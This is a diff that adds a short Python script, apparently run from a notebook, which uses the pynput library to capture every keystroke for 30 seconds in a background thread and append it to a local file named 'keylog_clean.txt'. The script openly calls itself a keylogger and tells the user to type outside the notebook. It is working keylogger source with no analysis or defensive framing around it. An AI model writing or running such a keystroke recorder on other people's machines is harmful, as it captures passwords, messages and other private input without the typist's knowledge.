@@ -1,1 +1,26 @@
+from pynput.keyboard import Listener
+import threading
+import time
 
+log_file = "keylog_clean.txt"
+
+def write_key(key):
+    with open(log_file, "a") as f:
+        k = str(key).replace("'", "")
+        if k.startswith("Key."):
+            k = f"[{k[4:].upper()}]"
+        f.write(k)
+
+def start_keylogger(duration=30):  # set to 30 seconds
+    def on_press(key):
+        write_key(key)
+
+    listener = Listener(on_press=on_press)
+    listener.start()
+
+    time.sleep(duration)
+    listener.stop()
+    print(f"✅ Keylogger stopped. Keystrokes saved in '{log_file}'")
+
+threading.Thread(target=start_keylogger, args=(30,)).start()
+print("🔐 Keylogger running... Type something outside this notebook.")
